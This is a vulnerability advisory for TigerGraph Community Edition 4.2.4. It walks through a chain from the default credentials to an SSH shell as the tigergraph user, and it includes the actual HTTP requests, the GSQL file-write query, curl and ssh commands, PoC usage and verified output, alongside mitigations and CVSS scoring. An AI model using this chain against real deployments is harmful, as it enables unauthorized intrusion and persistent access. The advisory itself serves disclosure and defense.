# TigerGraph Community Edition 4.2.4 — Default Hard-Coded Credentials + GSQL Arbitrary File Write + Unauthenticated REST++ Trigger → SSH RCE as `tigergraph`

## 1. Overview

TigerGraph Community Edition 4.2.4, distributed by the vendor as the Docker image `tigergraph/community:latest`, ships a default configuration in which a remote attacker can obtain code execution on the database host as the `tigergraph` operating-system account, without ever supplying a secret that is not already public. The product is a closed-source commercial graph database from TigerGraph (USA); the observed stack is a C++ core engine, the GSQL query language, the REST++ HTTP framework, a web admin GUI (nginx-fronted static SPA), and embedded ZooKeeper / ETCD / Kafka (the G5 upstream services, out of scope and not analysed). An OpenSSH 9.6p1 `sshd` is started inside the container by the product's own `entrypoint.sh`.

The chain composes four default-configuration weaknesses: (1) hard-coded credentials `tigergraph`/`tigergraph`, never forced to change (CWE-798); (2) a GSQL query parameter of type `FILE` passed to `PRINT ... TO_CSV` with no path validation, no base-directory confinement and no extension allowlist (CWE-73); (3) REST++ installed-query invocation requiring no authentication by default, `RESTPP.Factory.EnableAuth = False` (CWE-306); (4) that unrestricted path aimed at `/home/tigergraph/.ssh/authorized_keys`, a file owned and honoured by the same account (CWE-22) — turning arbitrary file write into SSH logon, and therefore into command execution as uid 1001. The research process is reproduced below in the order it ran: surface discovery (§3–§4 — port and authentication mapping, reverse-proxy topology, default-configuration proof from `tg.cfg`), sink localization (§5), chain construction (§6), and dynamic verification (§8 — live end-to-end run, target-side artefacts, iteration history, adversarial review).

## 2. Vulnerability Summary

- **Type**: arbitrary file write (CWE-73 / CWE-22) triggerable without authentication (CWE-306) once a file-write query has been installed with default hard-coded credentials (CWE-798); weaponised against `.ssh/authorized_keys` to yield SSH remote code execution.
- **CWE list**: CWE-798 (Use of Hard-coded Credentials), CWE-73 (External Control of File Name or Path), CWE-306 (Missing Authentication for Critical Function), CWE-22 (Improper Limitation of a Pathname to a Restricted Directory).
- **CVSS 3.1**: **9.8 Critical** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (full derivation in §11)
- **Entry points**: `POST /api/auth/login` (GUI, 14240); `POST /api/gsql-server/gsql/v1/statements?graph=<graph>` (GUI, 14240 → nginx-proxied to GSQL HTTP 8123); `GET /query/<graph>/<query>?f=<path>&c=<content>` (REST++, 9000, unauthenticated).
- **Sink**: GSQL `PRINT <expr> TO_CSV <file>` execution, performed as the `tigergraph` user.
- **Precondition**: a file-output query present in the catalog. It is not pre-installed; the attacker installs one with a single HTTP call using the shipped credentials. Any file-output query installed by any legitimate user satisfies the same precondition, after which the write trigger itself is purely unauthenticated.
- **Result**: arbitrary command execution as the **`tigergraph` OS user, uid 1001 — not root**. Verified `uid=1001(tigergraph) gid=1001(tigergraph) groups=1001(tigergraph)`.
- **Affected**: TigerGraph Community Edition 4.2.4 on `tigergraph/community:latest`. The research record notes ten NVD CVEs for TigerGraph, all in the 3.x line (2022–2023), and no public CVE for 4.2.4.

## 3. Product & Architecture

| Service | In-container port | Role |
|---|---|---|
| Web admin GUI | 14240 | nginx; static SPA plus reverse proxy to the GSQL HTTP service |
| REST++ | 9000 | nginx fronting the REST++ graph query API |
| GSQL HTTP | 8123 | Jersey / Spring statements endpoint, Basic Auth |
| GSQL server | 14250 | binary protocol, token authentication |
| sshd | 22 | OpenSSH 9.6p1, started by TigerGraph `entrypoint.sh` |

### Attack surface

Three properties of this topology carry the chain. First, the externally exposed GUI port reverse-proxies the GSQL statements service: the nginx configuration contains `server 127.0.0.1:8123`, so an attacker who can reach 14240 needs no independent route to 8123 — the proxy supplies it. Second, REST++ is a separate HTTP service on 9000 performing its own query-parameter binding and, by default, no authentication; it has no relationship whatever to the GUI credential check. Third, `sshd` is started by the product itself:

```sh
sudo /usr/sbin/sshd -h /home/tigergraph/.ssh/sshd_rsa
```

OpenSSH defaults apply (`PubkeyAuthentication=yes`, `AuthorizedKeysFile=.ssh/authorized_keys`), and nothing in the product ignores a key present in the `tigergraph` account's `authorized_keys`. That file is therefore a live, honoured credential store for the account owning the database engine, which makes it the natural bridge from arbitrary file write to code execution.

## 4. Authentication & Privilege Boundary

### Auth boundary inventory

| Surface | Default authentication | Evidence |
|---|---|---|
| GUI 14240 | login form; `tigergraph`/`tigergraph` accepted, never forced to change | response carries `"securityRecommendations":["Change default tigergraph user's password"]` and `isSuperUser:true` |
| GSQL HTTP 8123 | Basic Auth, same account | 401 without credentials; gate passes with `tigergraph:tigergraph` |
| REST++ 9000 | **none** | `RESTPP.Factory.EnableAuth = False` in `tg.cfg` |
| GSQL server 14250 | token authentication | not exercised by this chain |
| sshd 22 | public key / password | key honoured from `authorized_keys` |

The credentials were confirmed against the GSQL HTTP endpoint both with and without them. Without credentials the request is rejected; with the shipped pair the authentication gate is cleared and only a later parameter-shape check complains:

```bash
echo 'ls graphs' | curl -s -X POST 'http://127.0.0.1:8123/gsql/v1/statements' --data-binary @-
{"error":true,"message":"Authentication failed."}

echo 'ls graphs' | curl -s -X POST 'http://127.0.0.1:8123/gsql/v1/statements' \
     -u tigergraph:tigergraph --data-binary @-
{"error":true,"message":"The request was rejected because the parameter name \"ls graphs\n\" is not allowed."}
```

The REST++ no-auth posture comes from the product's own configuration file, whose timestamp establishes it as the shipped default rather than a research modification:

```bash
$ grep -i enableauth /home/tigergraph/tigergraph/data/configs/tg.cfg.*
RESTPP.Factory.EnableAuth = False
FileLoader.Factory.EnableAuth = False
# config file timestamp equals the container creation time (untouched since install) = product default
```

The boundary crossed at the end of the chain is an OS boundary, not a database-role boundary: the write executes as `tigergraph`, `authorized_keys` is owned by `tigergraph`, so `sshd` grants a `tigergraph` shell. The landing identity is uid 1001, and no escalation to root is claimed or demonstrated.

## 5. Root-Cause Analysis

The product is closed-source, so the evidence sits at configuration-key, protocol and observable-behaviour level; the research record documents no source line references for these components and none are invented here.

### Sink identification: `PRINT c TO_CSV f`

GSQL writes an expression to a file with `PRINT <expr> TO_CSV <file>`. When `<file>` is a query parameter of type `FILE`, the path is supplied entirely by the caller at invocation time, with no path validation, no base-directory restriction and no extension allowlist:

```gsql
CREATE QUERY qwrite_c(FILE f, STRING c) FOR GRAPH test_graph {
  PRINT c TO_CSV f;
}
```

`f` accepts arbitrary paths — `/home/tigergraph/.ssh/authorized_keys`, `/tmp/*`, and root-owned locations such as `/etc/cron.d/`; writes to the last of these fail because the executing identity is not root, which independently corroborates the uid 1001 landing identity. `c` accepts arbitrary content, written verbatim plus a trailing newline, as the `tigergraph` user, producing a file with owner/group `tigergraph` and mode `rw-r-----`.

Because CSV serialisation normally quotes fields containing spaces — which would destroy an SSH public key — the byte-level behaviour was probed before the sink was relied upon. Writing `c=ssh-rsa TESTVALUE with spaces` and dumping the result with `od -c` gave:

```
0000000   s   s   h   -   r   s   a       T   E   S   T   V   A   L   U
0000020   E       w   i   t   h       s   p   a   c   e   s  \n
```

Spaces do not trigger quoting and exactly one trailing newline is appended. An `authorized_keys` entry is one key per line, so a public key survives verbatim and remains parseable by OpenSSH. This byte-exactness check is what turns a generic write primitive into a usable execution bridge.

### Source identification

The primary source requires no credentials: `GET /query/<graph>/<query>?<param>=<value>`. REST++ binds URL query parameters onto the installed query's declared parameters by name — `f` to `FILE f`, `c` to `STRING c` — with no sanitisation at any hop, so the HTTP client controls both the destination path and the complete content of a write performed by the GSQL engine. The secondary source is install-time only and does need the default credentials: `POST /api/auth/login`, then `POST /api/gsql-server/gsql/v1/statements?graph=<graph>` carrying arbitrary GSQL DDL text, which is compiled and registered in the catalog by the GSQL server (`CREATE QUERY` + `INSTALL QUERY`) reachable through the GUI proxy.

### Data flow

```
Attacker HTTP request (no credentials)
  -> REST++ nginx :9000 (no auth check; EnableAuth = False)
  -> handler /query/<graph>/<query>; binding f -> FILE, c -> STRING (no sanitisation)
  -> GSQL engine executes PRINT c TO_CSV f -> write as tigergraph (uid 1001)
  -> /home/tigergraph/.ssh/authorized_keys

Attacker SSH connection -> sshd :22 (PubkeyAuthentication=yes)
  -> authorized_keys validates attacker private key -> tigergraph shell (uid=1001)
  -> arbitrary command execution
```

The install phase is the mirror image, and the only part needing credentials: `HTTP (tigergraph:tigergraph) -> GUI nginx :14240 -> reverse proxy to GSQL HTTP :8123 -> /api/gsql-server/gsql/v1/statements -> CREATE QUERY + INSTALL QUERY -> query callable from REST++`.

## 6. Exploit Chain Construction

**Step 1 — session via default credentials.** `POST /api/auth/login` with body `{"username":"tigergraph","password":"tigergraph"}` returns a session carrying `isSuperUser:true` plus the advisory `"securityRecommendations":["Change default tigergraph user's password"]`. The recommendation is not enforced and the credentials stay valid.

**Step 2 — install the file-write query through the GUI-proxied GSQL endpoint.**

```
POST /api/gsql-server/gsql/v1/statements?graph=test_graph
Authorization: Basic <base64(tigergraph:tigergraph)>
Content-Type: text/plain

USE GRAPH test_graph
CREATE OR REPLACE QUERY qwrite_c(FILE f, STRING c) FOR GRAPH test_graph {
  PRINT c TO_CSV f;
}
INSTALL QUERY qwrite_c
```

The proxy answers HTTP 200 with `{"error":false,"message":"Failed to parse response from GSQL server","results":null}` — a streaming-response artefact, not a failure. The query is compiled and callable immediately afterwards; automation that treats this body as terminal aborts the chain for no reason. **Step 3 — attacker key pair**: `ssh-keygen -t rsa -b 2048 -N '' -f /tmp/tg_rce_key -q`, then `chmod 600 /tmp/tg_rce_key`.

**Step 4 — unauthenticated write trigger over REST++.**

```bash
PUBKEY=$(cat /tmp/tg_rce_key.pub)
curl -s -G 'http://127.0.0.1:9000/query/test_graph/qwrite_c' \
  --data-urlencode 'f=/home/tigergraph/.ssh/authorized_keys' \
  --data-urlencode "c=$PUBKEY"
```

No `Authorization` header is sent; `curl -v` shows only `Host`, `User-Agent` and `Accept`, answered by `HTTP/1.1 200 OK` with body `{"version":{"edition":"community","api":"v2","schema":0},"error":false,"message":"","results":[]}`.

**Encoding constraint (load-bearing).** Spaces in the public key must be encoded as `%20`, never as `+`: REST++ does not decode `+` as a space, so form-style encoding corrupts the key into an unparsable `authorized_keys` line and the SSH step then fails with `Permission denied`. `curl --data-urlencode` emits `%20` and works; the Python PoC forces the same behaviour with `urllib.parse.urlencode(..., quote_via=urllib.parse.quote)`.

**Step 5 — SSH logon and execution.**

```bash
ssh -i /tmp/tg_rce_key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -p 22 tigergraph@<target> 'echo ===RCE_FINAL===; id; whoami; hostname; \
    echo RCE_SUCCESS > /tmp/tg_rce_marker; cat /tmp/tg_rce_marker'
```

## 7. PoC Usage

A standard-library-only Python 3 PoC ships with this advisory at `exploit/tigergraph_default_creds_ssh_rce.py`, importing only `urllib`, `json`, `base64`, `subprocess`, `os`, `sys`, `ssl` and `time` — no third-party packages. The SSH step invokes the system `ssh` binary through `subprocess`; the key pair is produced by invoking the system `ssh-keygen`.

```bash
# Single host, product default ports (GUI 14240, REST++ 9000, SSH 22)
python3 exploit/tigergraph_default_creds_ssh_rce.py --target <host> --cmd "id; whoami; hostname"

# Explicitly addressed surfaces (mirrors the lab topology)
python3 exploit/tigergraph_default_creds_ssh_rce.py --gui-host 127.0.0.1 --gui-port 14240 \
  --restpp-host 127.0.0.1 --restpp-port 9000 --ssh-host <container-ip> --ssh-port 22 \
  --graph test_graph --query qwrite_c --cmd 'id; whoami; hostname'
```

Defaults: GUI `127.0.0.1:14240`, REST++ `127.0.0.1:9000`, SSH `127.0.0.1:22`, credentials `tigergraph`/`tigergraph` (override with `--user` / `--pass`), graph `tg_rce_graph`, query `tg_fw_query`, command `id; whoami; hostname`, temporary private key `/tmp/tg_vuln001_key`. Passing `--target` sets all three hosts to the same value with product default ports. The script prints per-step status, deliberately omits `Authorization` on the REST++ write, and — if the SSH port is not network-reachable from the operator's position — still reports that the file-write primitive landed in `authorized_keys`, since that primitive is itself the security-relevant outcome. The PoC is for authorised security testing and coordinated disclosure only.

## 8. Verification Evidence

Evidence below is from a lab deployment of `tigergraph/community:latest` (Community Edition 4.2.4) under Docker. In-container ports 14240 (GUI) and 9000 (REST++) were published on host loopback ports for the run, and `sshd` was reachable only on the container network, addressed here as `<container-ip>:22`; commands are shown against the canonical in-container ports. `authorized_keys` was emptied first — `docker exec -u tigergraph <container> sh -c 'echo -n > /home/tigergraph/.ssh/authorized_keys'`, confirmed 0 bytes — so every byte subsequently present in that file was written by the chain. Target-side confirmation that the write landed:

```bash
$ docker exec <container> sh -c 'ls -la /home/tigergraph/.ssh/authorized_keys; \
    wc -c /home/tigergraph/.ssh/authorized_keys; head -c 70 /home/tigergraph/.ssh/authorized_keys'
-rw-r----- 1 tigergraph tigergraph 410 <date> /home/tigergraph/.ssh/authorized_keys
410 /home/tigergraph/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...
```

Code execution over SSH — the landing identity, including the `uid` that fixes it as a non-root account:

```
===RCE_FINAL===
uid=1001(tigergraph) gid=1001(tigergraph) groups=1001(tigergraph)
tigergraph
<container-hostname>
RCE_SUCCESS
```

The marker was then read back from inside the container, independently of the SSH session: `docker exec <container> cat /tmp/tg_rce_marker` returned `RCE_SUCCESS`. The automated end-to-end PoC run (graph `test_graph`, query `qwrite_c`, command `id; whoami; hostname; echo RCE_VIA_SCRIPT_OK`) produced the following; the JSON bodies, the `uid` output and the marker strings are verbatim from that run, while the bracketed status lines are rendered in English here to match the published PoC:

```
[*] REST++ response status=200: {"version":{"edition":"community","api":"v2","schema":0},"error":false,"message":"","results":[]}
[+] unauthenticated file write succeeded (error:false, no Authorization header)
uid=1001(tigergraph) gid=1001(tigergraph) groups=1001(tigergraph)
RCE_VIA_SCRIPT_OK
[+] === RCE succeeded (command execution as the tigergraph user) ===
--- exit code: 0 ---
```

Two defects had to be fixed before the chain executed, and both are informative about product behaviour. (i) `subprocess.run(capture_output=True)` is unavailable on the older Python 3 (< 3.7) present on the execution host; replacing it with `stdout=subprocess.PIPE, stderr=subprocess.PIPE` fixed the crash, but SSH still returned `Permission denied`. (ii) The decisive bug was space encoding: default `urllib.parse.urlencode` emits `+` for spaces, so `authorized_keys` received `ssh-rsa+AAAAB3...` — REST++ does not decode `+` as a space, the key was malformed, and SSH rejected it. Switching to `quote_via=urllib.parse.quote` (`%20`) made the key land byte-exact, after which SSH succeeded with `uid=1001(tigergraph)`. The `curl --data-urlencode` control path used `%20` throughout and never exhibited the problem, which is what isolated the defect.

**Adversarial review outcome.** The finding was put through a two-reviewer adversarial pass — one reviewer tasked with falsification, one with independent re-analysis from scratch. Both returned **NOT_REFUTED**. The independent reviewer reproduced the complete chain on its own, through the GUI default credentials, reaching `uid=1001(tigergraph)`.

## 9. Security Impact

### Reachability

| Chain stage | Default configuration? | Evidence |
|---|---|---|
| GUI default credentials `tigergraph`/`tigergraph` | yes | `securityRecommendations: Change default tigergraph user's password` — advised, not enforced |
| GUI reverse-proxies GSQL statements | yes | nginx `server 127.0.0.1:8123` |
| `PRINT TO_CSV` accepts arbitrary `FILE` paths | yes | no path validation; native `FILE` parameter support |
| REST++ requires no authentication | yes | `RESTPP.Factory.EnableAuth = False` |
| sshd running with public-key authentication | yes | started by `entrypoint.sh`; OpenSSH default `PubkeyAuthentication=yes` |
| File-write query pre-installed | **no** | installed by the attacker over the default credentials (one HTTP call) |

In the Docker lab, SSH 22 was bound to the container network and not host-mapped, while GUI and REST++ were externally reachable. A bare-metal or VM deployment is worse rather than better: TigerGraph starts `sshd` by default (the `SSH` section of `tg.cfg`), so port 22 is exposed alongside GUI 14240 and REST++ 9000 and the complete chain is remotely reachable end to end. A stronger exposure applies to any deployment already carrying custom queries with file output — once such a query exists, installed by any legitimate user for any legitimate purpose, the REST++ trigger needs no credentials at all and the chain degenerates into a purely unauthenticated arbitrary file write (CWE-306 + CWE-73) standing on its own.

- **Execution identity**: the `tigergraph` OS user, **uid 1001 — not root**. That account owns and runs the database engine, the graph data, the catalog and the configuration tree under `/home/tigergraph/tigergraph/`, so compromise of the product is total while compromise of the operating system is not; root-owned targets such as `/etc/cron.d/` are out of reach from this identity alone.
- **Confidentiality**: high — arbitrary read of graph data, GSQL catalog, query definitions, product configuration and credentials held by the service account, with an interactive shell for unconstrained exfiltration.
- **Integrity**: high — the write primitive is generic, not specific to `authorized_keys`; any path writable by uid 1001 can be created or truncated with attacker-chosen content, including product configuration and data artefacts.
- **Availability**: high — the engine, catalog and container services can be stopped, corrupted or made unbootable by writing to files the service account owns.
- **Persistence and lateral movement**: the planted key is durable, survives restarts and is invisible to product audit logs, because the write is an ordinary query invocation. A shell inside the database tier reaches every system connected to the graph database plus the internal network the appliance sits on, and such hosts typically hold connection credentials toward upstream and downstream systems.

## 10. Mitigation

**Vendor fixes, in priority order.** (1) Force a password change on the shipped account — require rotation of `tigergraph`/`tigergraph` at first login instead of emitting it as a `securityRecommendations` string (CWE-798); a recommendation that can be dismissed is not a control. (2) Default REST++ authentication to on — ship `RESTPP.Factory.EnableAuth = True` with installed queries requiring a token, rather than exposing every installed query to anonymous invocation (CWE-306). (3) Confine `FILE` parameters in `PRINT ... TO_CSV` to a configured base directory (for example `/home/tigergraph/tigergraph/output/`), reject absolute paths that escape it, and explicitly deny sensitive targets such as anything under `.ssh/` (CWE-73, CWE-22). (4) Separate query-installation privilege — installing a query that declares a `FILE` parameter should require elevated authority beyond the default superuser, or be subjected to a static path check at install time. (5) Reduce the SSH surface — starting `sshd` by default on a database appliance adds an authentication path unrelated to the product API; it should be off by default, or limited to an administratively provisioned key set.

**Operator hardening available today.** (6) Change the `tigergraph` account password immediately after installation, and treat any deployment still answering `tigergraph`/`tigergraph` as compromised-by-default. (7) Set `RESTPP.Factory.EnableAuth = True` in `tg.cfg` and require tokens for query invocation. (8) Audit the GSQL catalog for installed queries declaring `FILE` parameters and remove any that are not strictly required; place `/home/tigergraph/.ssh/authorized_keys` under file-integrity monitoring. (9) Do not expose GUI 14240, REST++ 9000 or SSH 22 to untrusted networks; place them behind mutually authenticated or VPN-only boundaries.

## 11. CWE & CVSS Rationale

**CWE classification.** CWE-798 (Use of Hard-coded Credentials): `tigergraph`/`tigergraph` is a shipped constant with no forced rotation, gating both the GUI session and the GSQL statements endpoint that installs queries. CWE-73 (External Control of File Name or Path): the `FILE` parameter is bound directly from REST++ URL query parameters into `PRINT ... TO_CSV` with no path validation, base-directory confinement or extension filtering. CWE-306 (Missing Authentication for Critical Function): with `EnableAuth = False`, invoking an installed query — including one that writes files — requires no authentication at all, and arbitrary file write is unambiguously a critical function. CWE-22 (Improper Limitation of a Pathname to a Restricted Directory): the unrestricted path is used to reach `/home/tigergraph/.ssh/authorized_keys`, a security-critical file outside every data directory, converting the write into authentication bypass and code execution.

**CVSS 3.1: 9.8 Critical — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.** `AV:N` — the chain is reachable entirely over HTTP (GUI 14240, REST++ 9000) plus SSH; no local access is needed. `AC:L` — no race, no memory-corruption reliability question, no special deployment shape; every step is a deterministic HTTP request and the whole chain completed as a single script run with exit code 0. `UI:N` — no user interaction at any step. `S:U` — the compromise stays within the vulnerable product's own authority. `C:H`/`I:H`/`A:H` — an interactive shell plus a generic arbitrary-file-write primitive, as the account that owns the graph database, yields full read, full modification and full denial of the product's data and services.

**Why `PR:N`.** The chain formally passes through one authenticated step (query installation) and one genuinely unauthenticated step (the REST++ write trigger). `PR:N` is nonetheless the correct derivation, because the only credential involved is a hard-coded default that the product never forces the operator to change. `tigergraph`/`tigergraph` is not a secret: it ships with the product, is echoed back in the login response, and remains valid on every unmodified installation — making it indistinguishable from a publicly known constant for scoring purposes, since the attacker supplies no privilege they did not already hold. This is the same treatment applied in this project's StreamSets DataCollector advisory (batch #9), where shipped `admin`/`admin` with no first-login password-change gate was likewise scored `PR:N` at 9.8. Scoring `PR:L` here would require trusting that operators change a credential the product only *suggests* changing, which is not a defensible assumption about default deployments. The REST++ file-write trigger reinforces the derivation, since that hop genuinely requires no credentials on any deployment.

**Alternative reading (rotated default).** For completeness: if an operator has changed the shipped `tigergraph` password, the query-installation step requires a genuinely valid account rather than a public constant, and the privilege metric becomes `PR:L`. Under that reading the score is **8.8 High — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`**. The exploitation chain, the privileges obtained (`tigergraph`, uid 1001) and the remediation are unchanged; only the metric differs. We publish 9.8 as the headline because it describes an unmodified installation, and state 8.8 here so that a reader who disagrees about default-credential treatment can see exactly what turns on that question.

**Execution identity, stated plainly.** Code execution is achieved as the **`tigergraph` operating-system user, uid 1001**. It is **not root**. The verified output is `uid=1001(tigergraph) gid=1001(tigergraph) groups=1001(tigergraph)`. That account is the application service user owning the database engine, all graph data and the product configuration tree, so the compromise of the product is total — but no privilege escalation to root is claimed, demonstrated or implied anywhere in this advisory.

*This advisory will be published at https://0day-rubbish.com/blog/tigergraph-default-creds-file-write-ssh-rce as part of batch-11. Disclosure status is tracked in DISCLOSURE-STATUS.md. Contact: disclosure@0day-rubbish.com.*
